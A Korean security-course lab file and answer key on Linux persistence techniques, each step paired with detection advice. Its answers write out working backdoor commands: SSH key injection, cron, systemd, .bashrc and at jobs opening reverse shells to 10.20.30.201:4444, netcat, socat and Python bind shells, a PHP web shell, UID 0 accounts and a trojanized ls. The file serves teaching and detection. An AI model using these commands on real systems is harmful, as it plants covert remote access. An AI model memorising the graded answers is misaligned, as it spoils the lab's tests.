@@ -1,0 +1,179 @@
+lab_id: "attack-nonai-week09"
+title: "지속성 확보 (Persistence)"
+version: "non-ai"
+course: "attack-nonai"
+week: 9
+description: "시스템 접근을 유지하기 위한 지속성(Persistence) 기법을 실습한다. 백도어 설치, SSH 키 주입, cron 악용, systemd 서비스 등록 등 다양한 방법으로 재접근 경로를 확보한다."
+difficulty: "hard"
+duration_minutes: 120
+objectives:
+  - "MITRE ATT&CK Persistence 전술의 주요 기법을 이해한다"
+  - "SSH 키 기반 백도어, cron 기반 지속성을 설정할 수 있다"
+  - "지속성 기법의 탐지 방법과 제거 방법을 학습한다"
+pass_threshold: 0.6
+steps:
+  - order: 1
+    instruction: "공격자 머신에서 SSH 키 쌍을 생성하고, web 서버(10.20.30.80)의 authorized_keys에 공개키를 추가하여 비밀번호 없이 접속할 수 있게 하라."
+    hint: "ssh-keygen으로 키를 생성하고 ssh-copy-id 또는 수동으로 공개키를 추가한다"
+    category: "exploit"
+    points: 10
+    answer: "ssh-keygen -t ed25519 -f /tmp/backdoor_key -N '' -q && sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'mkdir -p ~/.ssh && chmod 700 ~/.ssh' 2>/dev/null && cat /tmp/backdoor_key.pub | sshpass -p1 ssh web@10.20.30.80 'cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys' 2>/dev/null && ssh -i /tmp/backdoor_key -o StrictHostKeyChecking=no web@10.20.30.80 'echo SSH key backdoor successful: $(whoami)' 2>/dev/null"
+    answer_detail: "SSH 키 기반 백도어는 가장 은밀한 지속성 기법 중 하나이다. authorized_keys에 공격자의 공개키를 추가하면 비밀번호 변경과 무관하게 접속이 가능하다. 탐지를 위해 authorized_keys를 정기적으로 감사해야 한다."
+    verify:
+      type: "output_contains"
+      expect: "backdoor successful"
+      field: "stdout"
+  - order: 2
+    instruction: "web 서버에 cron 기반 리버스 셸 백도어를 설정하라. 매 5분마다 공격자에게 연결을 시도하는 cronjob을 작성하라(실제 실행은 하지 않고 crontab 형식만 작성)."
+    hint: "crontab -e로 편집하거나 echo로 crontab 형식을 출력한다"
+    category: "exploit"
+    points: 10
+    answer: "echo '# Cron-based reverse shell persistence' && echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/10.20.30.201/4444 0>&1\" 2>/dev/null' > /tmp/cron_backdoor.txt && echo 'Cron backdoor payload:' && cat /tmp/cron_backdoor.txt"
+    answer_detail: "cron 기반 백도어는 설정된 간격으로 반복 실행된다. 공격자의 리스너가 다운되어도 다음 실행 시점에 다시 연결된다. 탐지: crontab -l로 모든 사용자의 cron을 정기 검사한다."
+    verify:
+      type: "output_contains"
+      expect: "Cron backdoor payload"
+      field: "stdout"
+  - order: 3
+    instruction: "systemd 서비스 파일을 작성하여 시스템 부팅 시 자동으로 리버스 셸을 실행하는 백도어를 만들어라(파일 생성만, 설치는 하지 않음)."
+    hint: "/etc/systemd/system/에 .service 파일을 작성한다"
+    category: "exploit"
+    points: 10
+    answer: "cat > /tmp/backdoor.service << 'EOF'\n[Unit]\nDescription=System Update Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.20.30.201/4444 0>&1'\nRestart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\nEOF\necho 'Systemd backdoor service file:' && cat /tmp/backdoor.service"
+    answer_detail: "systemd 서비스 백도어는 시스템 부팅 시 자동 시작되며, Restart=always로 설정하면 종료되어도 자동 재시작된다. 합법적인 서비스명으로 위장하면 발견이 어렵다. 탐지: systemctl list-unit-files에서 비정상 서비스를 검사한다."
+    verify:
+      type: "output_contains"
+      expect: "Systemd backdoor"
+      field: "stdout"
+  - order: 4
+    instruction: ".bashrc에 백도어 명령을 삽입하여 사용자가 로그인할 때마다 리버스 셸을 실행하도록 하라(시뮬레이션만)."
+    hint: ".bashrc에 명령을 추가하면 셸 시작 시 자동 실행된다"
+    category: "exploit"
+    points: 10
+    answer: "echo '# .bashrc persistence payload (simulation only)' && echo 'echo \"nohup bash -i >& /dev/tcp/10.20.30.201/4444 0>&1 &\" >> ~/.bashrc' > /tmp/bashrc_backdoor.txt && echo 'Payload:' && cat /tmp/bashrc_backdoor.txt"
+    answer_detail: ".bashrc/.profile 백도어는 사용자가 셸을 열 때마다 실행된다. nohup과 &로 백그라운드 실행하면 사용자는 눈치채지 못한다. 탐지: .bashrc/.profile의 변경 이력을 FIM(File Integrity Monitoring)으로 감시한다."
+    verify:
+      type: "output_contains"
+      expect: "Payload:"
+      field: "stdout"
+  - order: 5
+    instruction: "web 서버에서 /tmp에 숨겨진 디렉토리를 생성하고 백도어 스크립트를 배치하라."
+    hint: "점(.)으로 시작하는 디렉토리는 ls에 표시되지 않는다"
+    category: "exploit"
+    points: 10
+    answer: "sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'mkdir -p /tmp/.hidden_backdoor && echo \"#!/bin/bash\" > /tmp/.hidden_backdoor/update.sh && echo \"# Simulated backdoor script\" >> /tmp/.hidden_backdoor/update.sh && chmod +x /tmp/.hidden_backdoor/update.sh && ls -la /tmp/.hidden_backdoor/' 2>/dev/null"
+    answer_detail: "숨겨진 디렉토리(.으로 시작)에 백도어를 배치하면 일반적인 ls 명령으로는 발견되지 않는다. /tmp, /dev/shm, /var/tmp 등 tmpfs 디렉토리가 자주 사용된다. 탐지: find로 숨겨진 파일/디렉토리를 정기 검색한다."
+    verify:
+      type: "output_contains"
+      expect: "update.sh"
+      field: "stdout"
+  - order: 6
+    instruction: "PAM(Pluggable Authentication Module) 백도어의 원리를 이해하기 위해 web 서버의 PAM 설정 파일을 확인하라."
+    hint: "/etc/pam.d/ 디렉토리의 설정 파일을 확인한다"
+    category: "analysis"
+    points: 10
+    answer: "sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'cat /etc/pam.d/sshd 2>/dev/null; echo ---; cat /etc/pam.d/common-auth 2>/dev/null' 2>/dev/null | head -30"
+    answer_detail: "PAM 백도어는 인증 모듈을 조작하여 특정 비밀번호로 모든 계정에 로그인할 수 있게 한다. pam_unix.so를 수정하거나 커스텀 PAM 모듈을 삽입하는 방식이다. 매우 은밀하지만 패키지 무결성 검사(debsums)로 탐지할 수 있다."
+    verify:
+      type: "output_contains"
+      expect: "pam"
+      field: "stdout"
+  - order: 7
+    instruction: "LD_PRELOAD 백도어의 원리를 이해하기 위해, 간단한 공유 라이브러리를 작성하고 LD_PRELOAD로 함수를 후킹하는 예제를 만들어라."
+    hint: "C 코드로 라이브러리를 작성하고 gcc -shared -fPIC로 컴파일한다"
+    category: "exploit"
+    points: 10
+    answer: "echo '#include <stdio.h>\n#include <unistd.h>\n__attribute__((constructor)) void init() {\n    printf(\"[LD_PRELOAD hook executed] PID=%d\\n\", getpid());\n}' > /tmp/hook.c && gcc -shared -fPIC -o /tmp/hook.so /tmp/hook.c 2>/dev/null && LD_PRELOAD=/tmp/hook.so id 2>/dev/null"
+    answer_detail: "LD_PRELOAD 백도어는 공유 라이브러리를 프로세스 시작 시 먼저 로딩하여 시스템 함수를 후킹한다. /etc/ld.so.preload에 등록하면 모든 프로세스에 적용된다. 탐지: /etc/ld.so.preload 파일 감시, ldd로 라이브러리 확인."
+    verify:
+      type: "output_contains"
+      expect: "LD_PRELOAD hook"
+      field: "stdout"
+  - order: 8
+    instruction: "web 서버에 새로운 사용자 계정을 추가하여 백도어로 활용하라. uid 0(root)의 계정을 생성하라(시뮬레이션)."
+    hint: "useradd 또는 /etc/passwd 직접 편집으로 계정을 추가한다"
+    category: "exploit"
+    points: 10
+    answer: "echo '# Backdoor user account (simulation)' && echo 'Method 1: useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor' && echo 'Method 2: echo \"backdoor:x:0:0::/root:/bin/bash\" >> /etc/passwd' && echo 'Method 3: echo \"backdoor:\\$6\\$salt\\$hash:0:0:99999:7:::\" >> /etc/shadow' && echo '---' && echo 'Detection: check /etc/passwd for duplicate UID 0 entries' && grep 'x:0:' /etc/passwd"
+    answer_detail: "UID 0 계정은 root와 동일한 권한을 가진다. /etc/passwd에 UID 0인 계정이 root 외에 존재하면 백도어의 강력한 징후이다. 탐지: awk -F: '$3==0' /etc/passwd로 UID 0 계정을 정기 검사한다."
+    verify:
+      type: "output_contains"
+      expect: "Detection"
+      field: "stdout"
+  - order: 9
+    instruction: "netcat 기반의 바인드 셸 백도어를 설정하는 명령을 작성하라. 특정 포트에서 연결을 대기하는 형태이다."
+    hint: "nc -lvnp PORT -e /bin/bash 형태이다"
+    category: "exploit"
+    points: 10
+    answer: "echo '=== Bind Shell Backdoors ===' && echo 'Netcat: nohup nc -lvnp 5555 -e /bin/bash &' && echo 'Socat: nohup socat TCP-LISTEN:5555,reuseaddr,fork EXEC:/bin/bash &' && echo 'Python: nohup python3 -c \"import socket,subprocess;s=socket.socket();s.bind((\\\"0.0.0.0\\\",5555));s.listen(1);c,_=s.accept();subprocess.call([\\\"/bin/bash\\\"],stdin=c,stdout=c,stderr=c)\" &' && echo '---' && echo 'Detection: ss -tlnp | grep LISTEN for unexpected ports'"
+    answer_detail: "바인드 셸은 대상 서버에서 특정 포트를 열고 연결을 대기한다. 리버스 셸과 달리 공격자가 대상으로 연결한다. 방화벽이 인바운드를 차단하면 사용할 수 없어 리버스 셸이 선호된다."
+    verify:
+      type: "output_contains"
+      expect: "Bind Shell Backdoors"
+      field: "stdout"
+  - order: 10
+    instruction: "웹 셸을 시뮬레이션하라. PHP 웹 셸 코드를 작성하고 web 서버의 웹 루트에 배치하는 방법을 설명하라."
+    hint: "<?php system($_GET['cmd']); ?> 형태의 웹 셸을 작성한다"
+    category: "exploit"
+    points: 10
+    answer: "echo '=== Web Shell Examples ===' && echo 'PHP: <?php system(\\$_GET[\"cmd\"]); ?>' > /tmp/webshell_example.php && echo 'JSP: <%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>' && echo 'Python: import os; os.system(request.args.get(\"cmd\"))' && echo '---' && echo 'Placement: /var/www/html/.hidden.php' && echo 'Usage: curl http://target/.hidden.php?cmd=id' && echo 'Detection: find /var/www -name \"*.php\" -newer /var/www/html/index.html' && cat /tmp/webshell_example.php"
+    answer_detail: "웹 셸은 웹 서버에 업로드된 스크립트로, HTTP 요청을 통해 원격 명령을 실행한다. 파일 업로드 취약점이나 RCE를 통해 배치된다. 탐지: FIM, 웹 루트의 최근 수정 파일 검색, WAF 규칙."
+    verify:
+      type: "output_contains"
+      expect: "Web Shell Examples"
+      field: "stdout"
+  - order: 11
+    instruction: "at 명령을 사용한 시간 기반 백도어를 작성하라. 특정 시간에 실행되는 일회성 작업을 예약하라."
+    hint: "at 명령은 지정 시간에 명령을 실행하는 일회성 스케줄러이다"
+    category: "exploit"
+    points: 10
+    answer: "echo 'echo backdoor_executed > /tmp/at_test' | at now + 1 minute 2>/dev/null; atq 2>/dev/null; echo '---'; echo 'at-based persistence: echo \"bash -i >& /dev/tcp/10.20.30.201/4444 0>&1\" | at now + 5 minutes'"
+    answer_detail: "at 명령은 cron과 달리 일회성 예약 실행이다. 포렌식에서 종종 간과되며, atq로 대기 중인 작업을 확인할 수 있다. 공격자는 여러 시간대에 분산하여 at 작업을 예약한다."
+    verify:
+      type: "output_contains"
+      expect: "---"
+      field: "stdout"
+  - order: 12
+    instruction: "SSH 서버 설정을 조작하여 지속적 접근을 확보하는 기법을 분석하라. web 서버의 sshd_config를 확인하라."
+    hint: "/etc/ssh/sshd_config 파일을 확인한다"
+    category: "analysis"
+    points: 10
+    answer: "sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'grep -E \"(PermitRootLogin|PasswordAuthentication|AuthorizedKeysFile|Port)\" /etc/ssh/sshd_config' 2>/dev/null && echo '---' && echo 'Persistence via sshd_config:' && echo '1. PermitRootLogin yes -> root SSH 직접 접속' && echo '2. AuthorizedKeysFile 변경 -> 숨겨진 위치의 키 파일 사용' && echo '3. 추가 Port 열기 -> 비표준 포트로 SSH 접속'"
+    answer_detail: "sshd_config를 조작하면 PermitRootLogin 활성화, 추가 포트 열기, 비표준 AuthorizedKeysFile 경로 설정 등으로 지속적 접근을 확보할 수 있다. 탐지: FIM으로 sshd_config 변경 감시."
+    verify:
+      type: "output_contains"
+      expect: "---"
+      field: "stdout"
+  - order: 13
+    instruction: "기존 시스템 바이너리를 트로이목마로 교체하는 기법을 분석하라. ls 명령을 래핑하여 숨겨진 파일을 표시하지 않는 예제를 작성하라."
+    hint: "원본 바이너리를 백업하고 래퍼 스크립트로 교체한다"
+    category: "exploit"
+    points: 10
+    answer: "echo '#!/bin/bash' > /tmp/trojan_ls.sh && echo '# Trojanized ls - hides .backdoor files' >> /tmp/trojan_ls.sh && echo '/usr/bin/ls.orig \"$@\" | grep -v backdoor' >> /tmp/trojan_ls.sh && echo '---' && echo 'Installation steps (NOT executed):' && echo '1. cp /usr/bin/ls /usr/bin/ls.orig' && echo '2. mv /tmp/trojan_ls.sh /usr/bin/ls' && echo '3. chmod +x /usr/bin/ls' && echo '---' && echo 'Detection: debsums --changed (Debian) or rpm -Va (RHEL)' && cat /tmp/trojan_ls.sh"
+    answer_detail: "시스템 바이너리 교체는 루트킷의 기본 기법이다. ls, ps, netstat 등을 수정하여 악성 프로세스와 파일을 숨긴다. 탐지: 패키지 무결성 검사(debsums, rpm -Va), AIDE/OSSEC의 FIM."
+    verify:
+      type: "output_contains"
+      expect: "Detection"
+      field: "stdout"
+  - order: 14
+    instruction: "지속성 기법 탐지를 위한 종합 검사 스크립트를 작성하라. SSH 키, cron, systemd, 숨겨진 파일 등을 한 번에 검사하라."
+    hint: "각 지속성 벡터를 순차적으로 검사하는 스크립트를 작성한다"
+    category: "analysis"
+    points: 15
+    answer: "sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'echo \"=== Persistence Hunt ===\"; echo \"[SSH Keys]\"; wc -l ~/.ssh/authorized_keys 2>/dev/null; echo \"[Cron]\"; crontab -l 2>/dev/null | wc -l; echo \"[Systemd]\"; ls /etc/systemd/system/*.service 2>/dev/null | wc -l; echo \"[Hidden /tmp]\"; find /tmp -name \".*\" -type d 2>/dev/null; echo \"[SUID]\"; find / -perm -4000 -newer /etc/hostname 2>/dev/null | wc -l; echo \"[at queue]\"; atq 2>/dev/null' 2>/dev/null"
+    answer_detail: "지속성 헌팅은 침해 대응(IR)의 핵심 활동이다. 정기적인 지속성 검사로 백도어를 조기에 발견할 수 있다. 자동화된 도구(OSSEC, Wazuh FIM)와 수동 검사를 병행하는 것이 효과적이다."
+    verify:
+      type: "output_contains"
+      expect: "Persistence Hunt"
+      field: "stdout"
+  - order: 15
+    instruction: "지속성 확보 실습 결과를 /tmp/persistence_report.txt에 정리하라. 사용한 기법, MITRE ATT&CK ID, 탐지 방법을 포함하라."
+    hint: "각 기법에 해당하는 MITRE ATT&CK 기법 ID를 매핑한다"
+    category: "analysis"
+    points: 15
+    answer: "echo -e '=== Persistence Report ===\\n\\n[Techniques Used]\\n1. SSH Authorized Keys (T1098.004) - authorized_keys에 공개키 추가\\n2. Cron Job (T1053.003) - 리버스 셸 cron 등록\\n3. Systemd Service (T1543.002) - 부팅 시 자동 실행 서비스\\n4. .bashrc Modification (T1546.004) - 로그인 시 실행\\n5. Hidden Files (T1564.001) - /tmp에 숨겨진 백도어\\n6. Web Shell (T1505.003) - 웹 루트에 PHP 셸\\n7. Account Creation (T1136.001) - UID 0 백도어 계정\\n\\n[Detection Methods]\\n- FIM: authorized_keys, sshd_config, /etc/passwd 감시\\n- Cron audit: 모든 사용자 crontab 정기 검사\\n- Network: 비정상 아웃바운드 연결 모니터링\\n- Process: 비정상 프로세스 트리 분석' > /tmp/persistence_report.txt && cat /tmp/persistence_report.txt"
+    answer_detail: "MITRE ATT&CK의 Persistence 전술에는 19개 기법이 있다. 각 기법의 ID를 매핑하면 조직의 방어 커버리지 갭을 분석할 수 있다. 보고서에 탐지 방법과 함께 제시하면 방어팀에 실질적인 가치를 제공한다."
+    verify:
+      type: "output_contains"
+      expect: "Persistence Report"
+      field: "stdout"
